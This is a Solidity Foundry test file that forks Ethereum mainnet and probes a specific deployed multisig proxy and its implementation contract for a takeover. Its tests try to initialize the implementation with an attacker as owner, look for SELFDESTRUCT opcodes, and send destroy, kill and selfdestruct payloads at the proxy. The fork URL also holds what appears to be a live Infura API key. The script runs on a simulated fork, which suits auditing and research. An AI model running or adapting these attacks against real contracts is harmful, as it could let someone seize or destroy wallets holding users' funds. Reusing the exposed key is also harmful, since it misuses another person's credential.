// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title ImplementationTakeover - Attack uninitialized implementation contracts
 * @notice The proxy at 0x98b81a38cc8Ff51BD3862418188264e0b2A6f0C8 delegates to
 *         implementation at 0x95Ca2f7959f8848795dFB0868C1b0c59Dd4E9330
 *
 * Attack vector: If implementation is not initialized, attacker can:
 * 1. Initialize the implementation directly with attacker as owner
 * 2. If implementation has selfdestruct, destroy it (breaking all proxies)
 */

interface IOwnbitMultiSig {
    function initialize(address[] calldata _owners, uint256 _required) external;
    function getOwners() external view returns (address[] memory);
    function getRequired() external view returns (uint256);
    function isOwner(address) external view returns (bool);
    function spend(address destination, uint256 value, uint8[] calldata vs, bytes32[] calldata rs, bytes32[] calldata ss, bytes calldata data) external;
    function spendNonce() external view returns (uint256);
    function owners(uint256) external view returns (address);
    function required() external view returns (uint256);
}

contract ImplementationTakeoverTest is Test {
    // The proxy contract
    address constant PROXY = 0x98b81a38cc8Ff51BD3862418188264e0b2A6f0C8;
    // The implementation contract
    address constant IMPL = 0x95Ca2f7959f8848795dFB0868C1b0c59Dd4E9330;

    address attacker = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    /**
     * CRITICAL ATTACK: Initialize uninitialized implementation
     * If the implementation contract was never initialized, we can take it over!
     */
    function test_Attack_InitializeImplementation() public {
        IOwnbitMultiSig impl = IOwnbitMultiSig(IMPL);

        console.log("=== CHECKING IMPLEMENTATION STATE ===");

        // Check if implementation is already initialized
        try impl.getOwners() returns (address[] memory owners) {
            console.log("Implementation owners count:", owners.length);
            if (owners.length == 0) {
                console.log("CRITICAL: Implementation has NO owners - UNINITIALIZED!");

                // Try to initialize with attacker as owner
                address[] memory newOwners = new address[](1);
                newOwners[0] = attacker;

                vm.startPrank(attacker);
                try impl.initialize(newOwners, 1) {
                    console.log("SUCCESS: Attacker took over implementation!");

                    // Verify takeover
                    address[] memory ownersAfter = impl.getOwners();
                    assertEq(ownersAfter.length, 1, "Should have 1 owner");
                    assertEq(ownersAfter[0], attacker, "Attacker should be owner");

                    // Check if implementation has any ETH
                    uint256 implBalance = IMPL.balance;
                    console.log("Implementation ETH balance:", implBalance);

                } catch Error(string memory reason) {
                    console.log("Initialize failed:", reason);
                }
                vm.stopPrank();
            } else {
                console.log("Implementation already initialized with owners");
                for (uint i = 0; i < owners.length; i++) {
                    console.log("  Owner", i, ":", owners[i]);
                }
            }
        } catch {
            console.log("Could not get owners - checking raw storage");

            // Check owners array length directly from storage (slot 1)
            bytes32 ownersLength = vm.load(IMPL, bytes32(uint256(1)));
            console.log("Owners length from storage:");
            console.logBytes32(ownersLength);

            if (uint256(ownersLength) == 0) {
                console.log("CRITICAL: Implementation appears UNINITIALIZED!");
            }
        }
    }

    /**
     * Check for selfdestruct in implementation
     * If attacker can cause implementation to selfdestruct, all proxies break
     */
    function test_Attack_CheckImplementationForSelfdestruct() public {
        bytes memory implCode = IMPL.code;
        console.log("Implementation bytecode length:", implCode.length);

        bool hasSelfDestruct = false;
        for (uint i = 0; i < implCode.length; i++) {
            if (implCode[i] == 0xff) {
                hasSelfDestruct = true;
                console.log("SELFDESTRUCT opcode found at position:", i);
                break;
            }
        }

        if (!hasSelfDestruct) {
            console.log("No SELFDESTRUCT in implementation - safe from destruction");
        }
    }

    /**
     * Check proxy storage layout vs implementation storage layout
     * Look for potential storage collision vulnerabilities
     */
    function test_Attack_StorageLayoutAnalysis() public {
        console.log("=== PROXY STORAGE ANALYSIS ===");

        // ProxyStorage layout:
        // slot 0: mapping(address => bool) isOwner
        // slot 1: address[] owners (length at slot 1, data at keccak256(1))
        // slot 2: uint required
        // slot 3: uint spendNonce

        for (uint256 i = 0; i < 10; i++) {
            bytes32 proxySlot = vm.load(PROXY, bytes32(i));
            bytes32 implSlot = vm.load(IMPL, bytes32(i));
            console.log("Slot", i);
            console.log("  Proxy:");
            console.logBytes32(proxySlot);
            console.log("  Impl:");
            console.logBytes32(implSlot);
        }
    }

    /**
     * Check if proxy has any special admin functions that could be exploited
     */
    function test_Attack_ProxyAdminFunctions() public {
        bytes memory proxyCode = PROXY.code;
        console.log("Proxy bytecode length:", proxyCode.length);

        // The proxy is only 278 bytes - it's a minimal proxy
        // Let's decode it to understand the pattern

        // Check for common proxy selectors:
        // - upgradeTo(address)
        // - changeAdmin(address)
        // - admin()

        bytes4[] memory adminSelectors = new bytes4[](5);
        adminSelectors[0] = bytes4(keccak256("upgradeTo(address)"));
        adminSelectors[1] = bytes4(keccak256("changeAdmin(address)"));
        adminSelectors[2] = bytes4(keccak256("admin()"));
        adminSelectors[3] = bytes4(keccak256("implementation()"));
        adminSelectors[4] = bytes4(keccak256("destroy()"));

        vm.startPrank(attacker);
        for (uint i = 0; i < adminSelectors.length; i++) {
            (bool success, bytes memory data) = PROXY.call(abi.encodeWithSelector(adminSelectors[i]));
            if (success) {
                console.log("CRITICAL: Admin function callable!");
                console.logBytes4(adminSelectors[i]);
                console.logBytes(data);
            }
        }
        vm.stopPrank();
    }

    /**
     * Direct analysis of proxy bytecode to find selfdestruct trigger
     */
    function test_Attack_AnalyzeProxyBytecode() public {
        bytes memory proxyCode = PROXY.code;
        console.log("=== PROXY BYTECODE ANALYSIS ===");
        console.log("Length:", proxyCode.length);

        // Check for SELFDESTRUCT (0xff)
        for (uint i = 0; i < proxyCode.length; i++) {
            if (proxyCode[i] == 0xff) {
                console.log("SELFDESTRUCT at position:", i);
                // Show surrounding context
                uint start = i > 5 ? i - 5 : 0;
                uint end = i + 5 < proxyCode.length ? i + 5 : proxyCode.length;
                console.log("Context bytes:");
                for (uint j = start; j < end; j++) {
                    console.log("  Position", j, ":");
                    console.logBytes1(proxyCode[j]);
                }
            }
        }

        // Check for DELEGATECALL (0xf4)
        for (uint i = 0; i < proxyCode.length; i++) {
            if (proxyCode[i] == 0xf4) {
                console.log("DELEGATECALL at position:", i);
            }
        }

        // Dump first 50 bytes for analysis
        console.log("First 50 bytes:");
        for (uint i = 0; i < 50 && i < proxyCode.length; i++) {
            console.logBytes1(proxyCode[i]);
        }
    }

    /**
     * Try to trigger any hidden functions via fallback
     */
    function test_Attack_FallbackFunctionExploit() public {
        vm.startPrank(attacker);

        // Try various calldata patterns that might trigger selfdestruct
        bytes[] memory payloads = new bytes[](5);
        payloads[0] = abi.encodeWithSignature("destroy()");
        payloads[1] = abi.encodeWithSignature("kill()");
        payloads[2] = abi.encodeWithSignature("suicide(address)", attacker);
        payloads[3] = abi.encodeWithSignature("selfdestruct(address)", attacker);
        payloads[4] = hex"ff";  // Just the opcode

        uint256 balanceBefore = PROXY.balance;
        console.log("Proxy balance before:", balanceBefore);

        for (uint i = 0; i < payloads.length; i++) {
            (bool success,) = PROXY.call(payloads[i]);
            console.log("Payload", i, "success:", success);
        }

        // Check if proxy still exists
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(0x98b81a38cc8Ff51BD3862418188264e0b2A6f0C8)
        }
        console.log("Proxy code size after attacks:", codeSize);

        vm.stopPrank();
    }
}
